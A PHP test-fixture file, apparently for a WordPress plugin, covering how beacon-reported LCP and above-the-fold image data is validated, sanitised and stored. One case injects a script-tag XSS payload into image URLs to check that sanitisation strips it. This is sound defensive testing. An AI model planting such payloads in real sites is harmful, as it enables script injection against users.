<?php

$long_array = [
	(object) [
		'type' => 'img',
		'label' => 'lcp',
		'src'   => 'http://example.org/lcp.jpg',
	],
];
$long_array_2 = [
	(object) [
		'type' => 'img',
		'src'   => 'http://example.org/lcp.jpg',
	],
];
for ( $i = 1; $i <= 50; $i++ ) {
	$long_array[] = (object) [
		'label' => 'above-the-fold',
		'type'  => 'img',
		'src'   => 'http://example.org/above-the-fold-' . $i . '.jpg',
	];
	$long_array_2[] = (object) [
		'type' => 'img',
		'src'   => 'http://example.org/above-the-fold-' . $i . '.jpg',
	];
}

$mime_types = [
	'jpg|jpeg|jpe' => 'image/jpeg',
	'gif'          => 'image/gif',
	'png'          => 'image/png',
	'bmp'          => 'image/bmp',
	'tiff|tif'     => 'image/tiff',
	'webp'         => 'image/webp',
	'avif'         => 'image/avif',
	'ico'          => 'image/x-icon',
	'heic'         => 'image/heic',
	'heif'         => 'image/heif',
	'heics'        => 'image/heic-sequence',
	'heifs'        => 'image/heif-sequence',
	'asf|asx'      => 'video/x-ms-asf',
];

/**
 * Builds a srcset-descriptor test case for a single LCP image.
 *
 * @param array  $lcp          The LCP image payload sent by the beacon.
 * @param string $expected_lcp The JSON stored for the LCP, or 'not found' when rejected.
 * @param array  $filetype     The wp_check_filetype() return value.
 *
 * @return array
 */
$srcset_descriptor_case = function ( array $lcp, string $expected_lcp, array $filetype ) use ( $mime_types ) {
	return [
		'config'   => [
			'filter'             => true,
			'url'                => 'http://example.org/test-page/',
			'is_mobile'          => false,
			'results'            => json_encode(
				[
					'lcp' => [
						array_merge( $lcp, [ 'label' => 'lcp' ] ),
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype'           => $filetype,
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org/test-page',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => $expected_lcp,
				'viewport'      => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url'           => 'http://example.org/test-page',
				'is_mobile'     => false,
				'lcp'           => $expected_lcp,
				'viewport'      => '[]',
				'last_accessed' => null,
				'status'        => 'completed',
				'error_message' => '',
			],
		],
	];
};

$jpg_filetype  = [
	'ext'  => 'jpg',
	'type' => 'image/jpeg',
];
$webp_filetype = [
	'ext'  => 'webp',
	'type' => 'image/webp',
];
$decimal_srcset = 'http://example.org/wp-content/uploads/venice-1x.webp 1x, http://example.org/wp-content/uploads/venice-1_5x.webp 1.5x, http://example.org/wp-content/uploads/venice-2x.webp 2x';

/**
 * Builds an img-srcset LCP payload and its expected stored JSON.
 *
 * @param string      $srcset          The srcset sent by the beacon.
 * @param string|null $expected_srcset The srcset expected in DB, null when no candidate survives (src-only img fallback).
 *
 * @return array
 */
$img_srcset_case = function ( string $srcset, $expected_srcset ) use ( $srcset_descriptor_case, $jpg_filetype ) {
	return $srcset_descriptor_case(
		[
			'type'   => 'img-srcset',
			'src'    => 'http://example.org/wp-content/uploads/image.jpg',
			'srcset' => $srcset,
			'sizes'  => '',
		],
		null === $expected_srcset
			? '{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}'
			: json_encode(
				(object) [
					'type'   => 'img-srcset',
					'src'    => 'http://example.org/wp-content/uploads/image.jpg',
					'srcset' => $expected_srcset,
					'sizes'  => '',
				]
			),
		$jpg_filetype
	);
};

return [
	'testShouldBailWhenNotAllowed' => [
		'config'   => [
			'filter'    => false,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode( [] ),
			'results' => json_encode(
				[
					'lcp' => []
				],
			),
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => [],
				'viewport'      => [],
				'last_accessed' => '2024-01-01 00:00:00',
			],
			'result'  => false,
			'message' => 'not allowed',
		],
	],
	'testShouldBailoutWhenDBError' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'type'  => 'img',
						'label' => 'lcp',
						'src'   => 'http://example.org/lcp.jpg',
					],
					(object) [
						'type'  => 'img',
						'label' => 'above-the-fold',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'type'  => 'img',
							'label' => 'lcp',
							'src'   => 'http://example.org/lcp.jpg',
						],
						(object) [
							'type'  => 'img',
							'label' => 'above-the-fold',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => false,
			'message' => 'error when adding the entry to the database',
		],
	],
	'testShouldAddItemToDB' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/lcp.jpg',
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/lcp.jpg',
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldAddItemToDBWhenMobile' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => true,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/lcp.jpg',
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/lcp.jpg',
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => true,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode(
					[
						(object) [
							'type' => 'img',
							'src'  => 'http://example.org/above-the-fold.jpg',
						],
					],
				),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => true,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpg',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldSanitizeLCPAndATF' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/lcp.jpg<script>alert("Test XSS");</script>',
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg<script>alert("Test XSS");</script>',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/lcp.jpg<script>alert("Test XSS");</script>',
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg<script>alert("Test XSS");</script>',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [
				'http://example.org/lcp.jpg<script>alert("Test XSS");</script>' => 'http://example.org/lcp.jpgscriptalert(Test%20XSS);/script',
				'http://example.org/above-the-fold.jpg<script>alert("Test XSS");</script>' => 'http://example.org/above-the-fold.jpgscriptalert(Test%20XSS);/script'
			],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpgscriptalert(Test%20XSS);/script',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpgscriptalert(Test%20XSS);/script',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/lcp.jpgscriptalert(Test%20XSS);/script',
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpgscriptalert(Test%20XSS);/script',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldSanitizeArrayLCPAndATF' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'bg-img',
						'src'   => '',
						'bg_set' => [
							[
								'src' => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src' => 'http://example.org/anotherlcp2.jpg'
							]
						]
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'bg-img',
							'src'   => '',
							'bg_set' => [
								[
									'src' => 'http://example.org/anotherlcp.jpg'
								],
								[
									'src' => 'http://example.org/anotherlcp2.jpg'
								]
							]
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [
			],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'bg-img',
						'bg_set' => [
							[
								'src'  => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src'  => 'http://example.org/anotherlcp2.jpg'
							],
						],
						'src'  => ''
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'bg-img',
						'bg_set' => [
							[
								'src'  => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src'  => 'http://example.org/anotherlcp2.jpg'
							],
						],
						'src'  => ''
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldSanitizeImageSrcWithLCPAndATFArray' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'bg-img-set',
						'src'   => [
							[
								'src' => 'http://example.org/lcp.jpg'
							],
							[
								'src' => 'http://example.org/random.jpg'
							]
						],
						'bg_set' => [
							[
								'src' => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src' => 'http://example.org/anotherlcp2.jpg'
							]
						]
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => 'img',
						'src'   => 'http://example.org/above-the-fold.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'bg-img-set',
							'src'   => [
								[
									'src' => 'http://example.org/lcp.jpg'
								],
								[
									'src' => 'http://example.org/random.jpg'
								]
							],
							'bg_set' => [
								[
									'src' => 'http://example.org/anotherlcp.jpg'
								],
								[
									'src' => 'http://example.org/anotherlcp2.jpg'
								]
							]
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => 'img',
							'src'   => 'http://example.org/above-the-fold.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'bg-img-set',
						'bg_set' => [
							[
								'src'  => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src'  => 'http://example.org/anotherlcp2.jpg'
							],
						],
						'src'   => ''
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'bg-img-set',
						'bg_set' => [
							[
								'src'  => 'http://example.org/anotherlcp.jpg'
							],
							[
								'src'  => 'http://example.org/anotherlcp2.jpg'
							],
						],
						'src'   => ''
					],
				),
				'viewport'      => json_encode( [
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/above-the-fold.jpg',
					],
				] ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldAddLongItemToDB' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				$long_array
			),
			'results' => json_encode(
				[
					'lcp' => $long_array,
				],
			),
			'filetype' => [
				'ext' => 'jpg',
				'type' => 'image/jpeg',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode( $long_array_2[0] ),
				'viewport'      => json_encode( array_slice( $long_array_2, 1, 20 ) ),
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode( $long_array_2[0] ),
				'viewport'      => json_encode( array_slice( $long_array_2, 1, 20 ) ),
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldNotAddItemToDBWhenNoData' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => '',
			'results' => json_encode(
				[
					'lcp' => []
				],
			),
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldReturnNotFound' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'src'   => "",
						'bg_set' => [],
						'type' => ''
					],
					(object) [
						'label' => 'above-the-fold',
						'type'  => '',
						'src'   => '',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'src'   => "",
							'bg_set' => [],
							'type' => ''
						],
						(object) [
							'label' => 'above-the-fold',
							'type'  => '',
							'src'   => '',
						],
					]
				],
			),
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],

	'testShouldAddItemToDBWhenScriptError' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => '',
			'results' => json_encode(
				[
					'lcp' => []
				],
			),
			'status'    => 'script_error',
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'failed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => 'Script error',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'failed',
				'error_message' => 'Script error',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldAddItemToDBWhenScriptTimeout' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => '',
			'results' => json_encode(
				[
					'lcp' => []
				],
			),
			'status'    => 'timeout',
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'failed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => 'Script timeout',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'failed',
				'error_message' => 'Script timeout',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],

	'testShouldBailoutWithNotValidImages1' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/file.php?url=img.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/file.php?url=img.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'php',
				'type' => false,
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldBailoutWithNotValidImages2' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/file.js?url=img.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/file.js?url=img.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'js',
				'type' => 'application/javascript',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldBailoutWithNotValidImages3' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/file.php#url=img.jpg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/file.php#url=img.jpg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'php',
				'type' => 'application/php',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldBailoutWithNotValidImages4' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'chrome-extension://extension-hash/path/to/image/x.svg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'chrome-extension://extension-hash/path/to/image/x.svg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'svg',
				'type' => 'image/svg+xml',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldBailoutWithNotValidImages5' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
						'label' => 'lcp',
						'type'  => 'bg-img',
						'src'   => 'linear-gradient(160deg, rgb(255, 255, 255) 0%, rgb(248, 246, 243) 100%)',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'bg-img',
							'src'   => 'linear-gradient(160deg, rgb(255, 255, 255) 0%, rgb(248, 246, 243) 100%)',
						],
					]
				],
			),
			'filetype' => [
				'ext' => false,
				'type' => false,
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => 'not found',
				'viewport'      => '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],
	'testShouldAddItemToDBWhenSvgWithHttpProtocol' => [
		'config'   => [
			'filter'    => true,
			'url'       => 'http://example.org',
			'is_mobile' => false,
			'lcp_images'    => json_encode(
				[
					(object) [
